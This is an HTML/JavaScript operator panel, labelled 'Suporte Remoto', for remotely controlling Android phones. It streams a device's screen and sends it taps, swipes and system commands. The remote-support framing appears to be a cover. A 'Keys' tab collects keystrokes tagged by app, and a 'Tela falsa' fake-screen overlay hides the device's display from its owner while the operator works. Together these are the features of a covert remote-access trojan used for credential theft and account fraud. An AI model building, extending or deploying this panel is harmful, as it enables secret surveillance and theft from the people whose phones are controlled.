<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Suporte Remoto</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@3.2.0/tabler-icons.min.css">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:100vh;display:flex;flex-direction:column;overflow:hidden}

/* Topbar */
.topbar{display:flex;align-items:center;justify-content:space-between;padding:10px 20px;background:#161b27;border-bottom:1px solid #2d3748;flex-shrink:0}
.logo{font-size:15px;font-weight:700;color:#fff;display:flex;align-items:center;gap:8px}
.logo i{color:#4299e1}
.badge{display:flex;align-items:center;gap:6px;font-size:11px;padding:3px 10px;border-radius:999px;background:#1a202c}
.badge.on{color:#68d391}.badge.off{color:#718096}
.dot{width:6px;height:6px;border-radius:50%;background:currentColor}

/* Tela de lista */
#tela-lista{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;gap:12px}
#tela-lista h2{font-size:13px;color:#718096;margin-bottom:4px}
.cliente-card{background:#161b27;border:1px solid #2d3748;border-radius:12px;padding:14px 18px;width:380px;display:flex;align-items:center;justify-content:space-between;gap:12px;transition:border-color .2s}
.cliente-card:hover{border-color:#4299e1}
.cliente-card.offline{opacity:.5}
.cliente-info{flex:1}
.cliente-info .nome{font-size:13px;font-weight:600;color:#e2e8f0;display:flex;align-items:center;gap:8px}
.cliente-info .detalhe{font-size:11px;color:#718096;margin-top:3px}
.status-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
.status-dot.on{background:#68d391}.status-dot.off{background:#4a5568}
.btn-atender{padding:7px 16px;background:#4299e1;border:none;border-radius:8px;color:#fff;cursor:pointer;font-size:12px;font-weight:500;white-space:nowrap}
.btn-atender:hover{background:#3182ce}
.btn-atender:disabled{background:#2d3748;color:#4a5568;cursor:not-allowed}
.sem-clientes{color:#4a5568;font-size:13px;text-align:center}
.sem-clientes i{font-size:32px;display:block;margin-bottom:8px;color:#2d3748}

/* Tela do painel */
#tela-painel{flex:1;display:none;overflow:hidden}
.painel-inner{display:grid;grid-template-columns:190px 1fr 230px;height:100%}

/* Sidebar */
.sidebar{background:#161b27;border-right:1px solid #2d3748;padding:10px;display:flex;flex-direction:column;gap:2px;overflow-y:auto}
.sec{font-size:9px;color:#4a5568;letter-spacing:.08em;text-transform:uppercase;padding:8px 6px 3px}
.ctrl{display:flex;align-items:center;gap:7px;padding:7px 8px;border-radius:7px;border:none;background:transparent;color:#a0aec0;cursor:pointer;font-size:11px;width:100%;text-align:left}
.ctrl:hover{background:#1e2433;color:#e2e8f0}
.ctrl i{font-size:13px;color:#4a5568;flex-shrink:0}
.ctrl.warn{color:#ed8936}.ctrl.warn i{color:#ed8936}
.ctrl.purple{color:#9f7aea}.ctrl.purple i{color:#9f7aea}
.ctrl.purple:hover{background:#1a1535}
.ctrl.danger{color:#fc8181}.ctrl.danger i{color:#fc8181}
.ctrl.danger:hover{background:#2d1515}
.ctrl.overlay-on{color:#fc8181;animation:pulse 1.5s infinite}
.ctrl.overlay-on i{color:#fc8181}
.vol-row{display:flex;align-items:center;gap:6px;padding:3px 0;font-size:10px;color:#4a5568}
.vol-row input{flex:1;accent-color:#4299e1}

/* Centro */
.center{display:flex;flex-direction:column;align-items:center;padding:12px 16px;gap:8px;overflow:hidden}
.device{background:#0a0a0a;border:2px solid #2d3748;border-radius:28px;flex-shrink:0;overflow:hidden;cursor:crosshair;position:relative}
#canvas{display:block}
.waiting{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#2d3748;font-size:11px;gap:6px}
.waiting i{font-size:28px}
.nav-bar{display:flex;gap:5px;justify-content:center;flex-wrap:wrap;flex-shrink:0}
.nav-btn{padding:7px 11px;background:#1e2433;border:1px solid #2d3748;border-radius:8px;color:#718096;cursor:pointer;font-size:10px;display:flex;align-items:center;gap:3px;flex-direction:column}
.nav-btn:hover{background:#2d3748;color:#fff}
.nav-btn.purple{border-color:#553c8b;color:#9f7aea}
.nav-btn.overlay-on{border-color:#fc8181;color:#fc8181;animation:pulse 1.5s infinite}
.nav-btn i{font-size:14px}
.nav-btn span{font-size:8px}

/* Direita */
.right{border-left:1px solid #2d3748;background:#161b27;padding:10px;display:flex;flex-direction:column;overflow:hidden}
.stat-row{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #1a202c;font-size:10px}
.stat-label{color:#4a5568}.stat-val{color:#e2e8f0;font-weight:500}
.msg-area{margin-top:8px;flex-shrink:0}
.msg-area input{width:100%;background:#1a202c;border:1px solid #2d3748;border-radius:6px;padding:6px 8px;color:#e2e8f0;font-size:11px;outline:none;margin-bottom:4px}
.msg-area input:focus{border-color:#4299e1}
.msg-area button{width:100%;padding:5px;background:#4299e1;border:none;border-radius:6px;color:#fff;cursor:pointer;font-size:11px}
.msg-area button:hover{background:#3182ce}
.tabs{display:flex;gap:3px;margin-top:8px;flex-shrink:0}
.tab{padding:3px 8px;border-radius:5px;border:1px solid #2d3748;background:transparent;color:#718096;cursor:pointer;font-size:9px}
.tab.active{background:#1e2433;color:#e2e8f0;border-color:#4299e1}
.log{flex:1;overflow-y:auto;min-height:0;margin-top:4px}
.log-entry{font-size:9px;padding:2px 0;border-bottom:1px solid #1a202c;color:#4a5568}
.log-entry .ts{color:#2d3748;margin-right:4px}
.log-entry.ev{color:#68d391}.log-entry.err{color:#fc8181}.log-entry.warn{color:#ed8936}
.keylog-entry{font-size:10px;padding:3px 4px;border-bottom:1px solid #1a202c;color:#e2e8f0;font-family:monospace}
.keylog-entry .app{font-size:8px;color:#4a5568;display:block}

@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
</style>
</head>
<body>

<div class="topbar">
  <div class="logo"><i class="ti ti-device-laptop"></i> Suporte Remoto</div>
  <div style="display:flex;align-items:center;gap:10px">
    <span class="badge off" id="badge"><span class="dot"></span> Desconectado</span>
    <span style="font-size:10px;color:#4a5568" id="token-top"></span>
    <button id="btn-voltar" onclick="encerrarSessao()" style="display:none;padding:4px 10px;background:#1e2433;border:1px solid #2d3748;border-radius:6px;color:#a0aec0;cursor:pointer;font-size:11px">
      <i class="ti ti-arrow-left"></i> Voltar
    </button>
  </div>
</div>

<div style="display:flex;flex:1;overflow:hidden">

  <!-- LISTA DE CLIENTES -->
  <div id="tela-lista">
    <h2><i class="ti ti-devices" style="margin-right:6px"></i>Dispositivos</h2>
    <div id="lista" style="display:flex;flex-direction:column;gap:8px;width:380px">
      <div class="sem-clientes"><i class="ti ti-device-mobile-off"></i>Nenhum dispositivo conectado</div>
    </div>
  </div>

  <!-- PAINEL DO TÉCNICO -->
  <div id="tela-painel">
    <div class="painel-inner">

      <div class="sidebar">
        <p class="sec">Sistema</p>
        <button class="ctrl" onclick="cmd('home')"><i class="ti ti-home"></i> Home</button>
        <button class="ctrl" onclick="cmd('back')"><i class="ti ti-arrow-left"></i> Voltar</button>
        <button class="ctrl" onclick="cmd('recents')"><i class="ti ti-layout-grid"></i> Recentes</button>
        <button class="ctrl" onclick="cmd('lock')"><i class="ti ti-lock"></i> Bloquear</button>
        <button class="ctrl" onclick="cmd('notifications')"><i class="ti ti-bell"></i> Notificações</button>
        <button class="ctrl" onclick="cmd('settings')"><i class="ti ti-settings"></i> Config.</button>
        <button class="ctrl" onclick="cmd('camera')"><i class="ti ti-camera"></i> Câmera</button>
        <p class="sec">Wi-Fi / BT</p>
        <button class="ctrl" onclick="cmd('wifi_on')"><i class="ti ti-wifi"></i> Wi-Fi ON</button>
        <button class="ctrl" onclick="cmd('wifi_off')"><i class="ti ti-wifi-off"></i> Wi-Fi OFF</button>
        <button class="ctrl" onclick="cmd('bt_on')"><i class="ti ti-bluetooth"></i> BT ON</button>
        <button class="ctrl" onclick="cmd('bt_off')"><i class="ti ti-bluetooth-off"></i> BT OFF</button>
        <p class="sec">Volume / Brilho</p>
        <div class="vol-row"><i class="ti ti-volume"></i><input type="range" min="0" max="15" value="5" oninput="send({tipo:'volume',valor:+this.value})"></div>
        <div class="vol-row"><i class="ti ti-brightness"></i><input type="range" min="0" max="255" value="120" oninput="send({tipo:'brilho',valor:+this.value})"></div>
        <p class="sec">Controle</p>
        <button class="ctrl warn" onclick="cmd('solicitar_tela')"><i class="ti ti-refresh"></i> Atualizar tela</button>
        <button class="ctrl" onclick="cmd('pedir_permissoes')"><i class="ti ti-shield-check"></i> Permissões</button>
        <button class="ctrl purple" id="btn-overlay-s" onclick="toggleOverlay()"><i class="ti ti-device-mobile-pause"></i> Tela falsa</button>
        <p class="sec">Sessão</p>
        <button class="ctrl danger" onclick="encerrarSessao()"><i class="ti ti-plug-x"></i> Encerrar</button>
      </div>

      <div class="center">
        <div class="device" id="device">
          <canvas id="canvas"></canvas>
          <div class="waiting" id="waiting"><i class="ti ti-device-mobile"></i>Aguardando tela...</div>
        </div>
        <div class="nav-bar">
          <button class="nav-btn" onclick="cmd('back')"><i class="ti ti-arrow-left"></i><span>Voltar</span></button>
          <button class="nav-btn" onclick="cmd('home')"><i class="ti ti-circle"></i><span>Home</span></button>
          <button class="nav-btn" onclick="cmd('recents')"><i class="ti ti-square"></i><span>Recentes</span></button>
          <button class="nav-btn" onclick="send({tipo:'swipe',dir:'up'})"><i class="ti ti-arrow-up"></i><span>↑</span></button>
          <button class="nav-btn" onclick="send({tipo:'swipe',dir:'down'})"><i class="ti ti-arrow-down"></i><span>↓</span></button>
          <button class="nav-btn" onclick="cmd('solicitar_tela')"><i class="ti ti-refresh"></i><span>Atualizar</span></button>
          <button class="nav-btn purple" id="btn-overlay-n" onclick="toggleOverlay()"><i class="ti ti-device-mobile-pause"></i><span>Tela falsa</span></button>
        </div>
      </div>

      <div class="right">
        <p class="sec">Dispositivo</p>
        <div class="stat-row"><span class="stat-label">Modelo</span><span class="stat-val" id="d-model">—</span></div>
        <div class="stat-row"><span class="stat-label">Android</span><span class="stat-val" id="d-os">—</span></div>
        <div class="stat-row"><span class="stat-label">Bateria</span><span class="stat-val" id="d-bat">—</span></div>
        <div class="stat-row"><span class="stat-label">RAM</span><span class="stat-val" id="d-ram">—</span></div>
        <div class="stat-row"><span class="stat-label">Wi-Fi</span><span class="stat-val" id="d-wifi">—</span></div>
        <div class="stat-row"><span class="stat-label">Resolução</span><span class="stat-val" id="d-res">—</span></div>
        <div class="msg-area">
          <input id="msg-input" type="text" placeholder="Mensagem ao dispositivo..."
            onkeydown="if(event.key==='Enter') enviarMsg()">
          <button onclick="enviarMsg()"><i class="ti ti-send"></i> Enviar</button>
        </div>
        <div class="tabs">
          <button class="tab active" id="tab-log" onclick="aba('log')">📋 Log</button>
          <button class="tab" id="tab-key" onclick="aba('key')">⌨️ Keys<span id="key-badge" style="display:none;background:#fc8181;color:#fff;border-radius:999px;padding:0 4px;font-size:8px;margin-left:2px">!</span></button>
        </div>
        <div class="log" id="painel-log"></div>
        <div class="log" id="painel-key" style="display:none"></div>
      </div>

    </div>
  </div>
</div>

<script>
const WS_URL = window.location.origin.replace(/^http/, 'ws');
const VISOR_W = 270;
let ws = null, deviceAtual = null;
let dw = 1080, dh = 2340;
let abaAtual = 'log', overlayAtivo = false;

// ── Conexão ───────────────────────────────────────────────────────────────

function conectar() {
  ws = new WebSocket(`${WS_URL}?papel=tecnico`);
  ws.onopen = () => {
    setBadge(true);
    log('Painel conectado', 'ev');
  };
  ws.onmessage = (e) => {
    const msg = JSON.parse(e.data);
    switch (msg.tipo) {
      case 'lista_clientes':     renderLista(msg.clientes); break;
      case 'sessao_iniciada':    abrirPainel(msg); break;
      case 'screenshot':         mostrarScreenshot(msg.frame); break;
      case 'arvore_tela':        desenharWireframe(JSON.parse(msg.elementos), msg.pacote); break;
      case 'keylog':             logKey(msg.texto, msg.app || '?'); break;
      case 'cliente_offline':    log('Cliente ficou offline', 'warn'); break;
      case 'cliente_desconectou':log('Cliente desconectou', 'err'); break;
      case 'erro':               log('Erro: ' + msg.msg, 'err'); break;
    }
  };
  ws.onclose = () => { setBadge(false); setTimeout(conectar, 2000); };
}
conectar();

function send(msg) {
  if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(msg));
}
function cmd(c) { send({tipo:'cmd', cmd:c}); log(`→ ${c}`); }

// ── Lista ─────────────────────────────────────────────────────────────────

function renderLista(clientes) {
  const el = document.getElementById('lista');
  if (!clientes || !clientes.length) {
    el.innerHTML = '<div class="sem-clientes"><i class="ti ti-device-mobile-off"></i>Nenhum dispositivo</div>';
    return;
  }
  el.innerHTML = clientes.map(c => `
    <div class="cliente-card ${c.online ? '' : 'offline'}">
      <div class="cliente-info">
        <div class="nome">
          <span class="status-dot ${c.online ? 'on' : 'off'}"></span>
          ${c.info?.modelo || 'Dispositivo'}
        </div>
        <div class="detalhe">
          ${c.info?.android || '—'} &nbsp;·&nbsp;
          Bat: ${c.info?.bateria || '—'} &nbsp;·&nbsp;
          ${c.info?.wifi || '—'}
          ${c.emAtendimento ? ' &nbsp;·&nbsp; <span style="color:#4299e1">Em atendimento</span>' : ''}
        </div>
      </div>
      <button class="btn-atender" onclick="atender('${c.deviceToken}')" ${!c.online ? 'disabled' : ''}>
        <i class="ti ti-headset"></i> ${c.emAtendimento ? 'Retomar' : 'Atender'}
      </button>
    </div>
  `).join('');
}

function atender(token) {
  send({tipo: 'conectar_cliente', deviceToken: token});
}

// ── Painel ────────────────────────────────────────────────────────────────

function abrirPainel(msg) {
  deviceAtual = msg.deviceToken;
  atualizarInfo(msg.info);
  document.getElementById('tela-lista').style.display = 'none';
  document.getElementById('tela-painel').style.display = 'flex';
  document.getElementById('btn-voltar').style.display = 'block';
  document.getElementById('token-top').textContent = `Token: ${deviceAtual}`;
  log('Sessão iniciada', 'ev');
  setTimeout(() => cmd('solicitar_tela'), 500);
}

function encerrarSessao() {
  send({tipo: 'sair_sessao'});
  deviceAtual = null;
  overlayAtivo = false;
  document.getElementById('tela-painel').style.display = 'none';
  document.getElementById('tela-lista').style.display = 'flex';
  document.getElementById('btn-voltar').style.display = 'none';
  document.getElementById('token-top').textContent = '';
  limparCanvas();
  log('Sessão encerrada', 'warn');
}

// ── Canvas ────────────────────────────────────────────────────────────────

function tamanhoCanvas() {
  const h = Math.round(VISOR_W * dh / dw);
  const device = document.getElementById('device');
  const canvas = document.getElementById('canvas');
  device.style.width  = canvas.style.width  = VISOR_W + 'px';
  device.style.height = canvas.style.height = h + 'px';
  canvas.width  = VISOR_W;
  canvas.height = h;
  return { sw: VISOR_W, sh: h };
}

function mostrarScreenshot(base64) {
  const {sw, sh} = tamanhoCanvas();
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');
  const img = new Image();
  img.onload = () => {
    ctx.drawImage(img, 0, 0, sw, sh);
    document.getElementById('waiting').style.display = 'none';
  };
  img.src = 'data:image/jpeg;base64,' + base64;
}

function desenharWireframe(els, pacote) {
  const {sw, sh} = tamanhoCanvas();
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');
  ctx.fillStyle = '#fff';
  ctx.fillRect(0, 0, sw, sh);
  const sx = sw/dw, sy = sh/dh;
  const uteis = els.filter(e => e.clicavel||e.editavel||e.rolavel||(e.txt&&e.txt.trim())||(e.desc&&e.desc.trim()));
  uteis.forEach(e => {
    const x=e.x*sx, y=e.y*sy, w=e.w*sx, h=e.h*sy;
    if(e.editavel){ ctx.strokeStyle='#4299e1'; ctx.fillStyle='rgba(66,153,225,.1)'; }
    else if(e.clicavel){ ctx.strokeStyle='#333'; ctx.fillStyle='#f0f0f0'; }
    else { ctx.strokeStyle='#ccc'; ctx.fillStyle='transparent'; }
    ctx.lineWidth = e.clicavel||e.editavel ? 1.2 : 0.5;
    const r = e.clicavel ? 3 : 0;
    ctx.beginPath(); ctx.roundRect(x,y,w,h,r); ctx.fill(); ctx.stroke();
    const label = (e.txt||e.desc||'').trim();
    if(label && h>6) {
      const fs = Math.min(11, Math.max(7, h*.4));
      ctx.fillStyle = e.editavel ? '#4299e1' : '#222';
      ctx.font = `${fs}px system-ui`;
      ctx.textAlign='center'; ctx.textBaseline='middle';
      ctx.save(); ctx.beginPath(); ctx.rect(x+2,y,w-4,h); ctx.clip();
      ctx.fillText(label.substring(0,25), x+w/2, y+h/2);
      ctx.restore();
    }
    if(e.editavel){ ctx.fillStyle='#4299e1'; ctx.fillRect(x+2,y+h-2,w-4,2); }
  });
  if(pacote){ ctx.fillStyle='rgba(0,0,0,.4)'; ctx.fillRect(0,0,sw,13); ctx.fillStyle='#fff'; ctx.font='bold 8px system-ui'; ctx.textAlign='center'; ctx.fillText(pacote.split('.').pop(),sw/2,9); }
  document.getElementById('waiting').style.display = 'none';
}

function limparCanvas() {
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');
  ctx.fillStyle = '#0a0a0a';
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  document.getElementById('waiting').style.display = 'flex';
}

// ── Toque ─────────────────────────────────────────────────────────────────

document.getElementById('device').addEventListener('click', (e) => {
  const r = e.currentTarget.getBoundingClientRect();
  const xPct = Math.max(0, Math.min(100, (e.clientX-r.left)/r.width*100));
  const yPct = Math.max(0, Math.min(100, (e.clientY-r.top)/r.height*100));
  send({tipo:'toque', x:+xPct.toFixed(4), y:+yPct.toFixed(4), largura:dw, altura:dh});
  log(`→ toque ${xPct.toFixed(1)}% ${yPct.toFixed(1)}%`);
});

// ── Overlay ───────────────────────────────────────────────────────────────

function toggleOverlay() {
  overlayAtivo = !overlayAtivo;
  send({tipo:'cmd', cmd: overlayAtivo ? 'overlay_on' : 'overlay_off'});
  const bn = document.getElementById('btn-overlay-n');
  const bs = document.getElementById('btn-overlay-s');
  if(overlayAtivo) {
    bn.className='nav-btn overlay-on'; bn.innerHTML='<i class="ti ti-device-mobile-pause"></i><span>Remover</span>';
    bs.className='ctrl overlay-on'; bs.innerHTML='<i class="ti ti-device-mobile-pause"></i> Remover tela';
    log('→ Tela falsa ON','warn');
  } else {
    bn.className='nav-btn purple'; bn.innerHTML='<i class="ti ti-device-mobile-pause"></i><span>Tela falsa</span>';
    bs.className='ctrl purple'; bs.innerHTML='<i class="ti ti-device-mobile-pause"></i> Tela falsa';
    log('→ Tela falsa OFF','ev');
  }
}

// ── Info ──────────────────────────────────────────────────────────────────

function atualizarInfo(info) {
  if(!info) return;
  document.getElementById('d-model').textContent = info.modelo||'—';
  document.getElementById('d-os').textContent    = info.android||'—';
  document.getElementById('d-bat').textContent   = info.bateria||'—';
  document.getElementById('d-ram').textContent   = info.ram||'—';
  document.getElementById('d-wifi').textContent  = info.wifi||'—';
  if(info.largura && info.altura) {
    dw = parseInt(info.largura);
    dh = parseInt(info.altura);
    document.getElementById('d-res').textContent = `${dw}×${dh}`;
    tamanhoCanvas();
  }
}

// ── Mensagem ──────────────────────────────────────────────────────────────

function enviarMsg() {
  const v = document.getElementById('msg-input').value.trim();
  if(!v) return;
  send({tipo:'mensagem', texto:v});
  log(`→ msg: ${v}`, 'ev');
  document.getElementById('msg-input').value = '';
}

// ── Log ───────────────────────────────────────────────────────────────────

function aba(a) {
  abaAtual = a;
  document.getElementById('painel-log').style.display = a==='log'?'block':'none';
  document.getElementById('painel-key').style.display = a==='key'?'block':'none';
  document.getElementById('tab-log').className = 'tab'+(a==='log'?' active':'');
  document.getElementById('tab-key').className = 'tab'+(a==='key'?' active':'');
  if(a==='key') document.getElementById('key-badge').style.display='none';
}

function log(msg, tipo='') {
  const el = document.getElementById('painel-log');
  const d = document.createElement('div');
  d.className = 'log-entry '+tipo;
  d.innerHTML = `<span class="ts">${new Date().toLocaleTimeString('pt-BR')}</span>${msg}`;
  el.prepend(d);
}

function logKey(texto, app) {
  const el = document.getElementById('painel-key');
  const d = document.createElement('div');
  d.className = 'keylog-entry';
  d.innerHTML = `<span class="app">${new Date().toLocaleTimeString('pt-BR')} — ${app}</span>${texto}`;
  el.prepend(d);
  if(abaAtual!=='key') document.getElementById('key-badge').style.display='inline';
}

function setBadge(on) {
  const b = document.getElementById('badge');
  b.className = 'badge '+(on?'on':'off');
  b.innerHTML = `<span class="dot"></span> ${on?'Conectado':'Desconectado'}`;
}
</script>
</body>
</html>
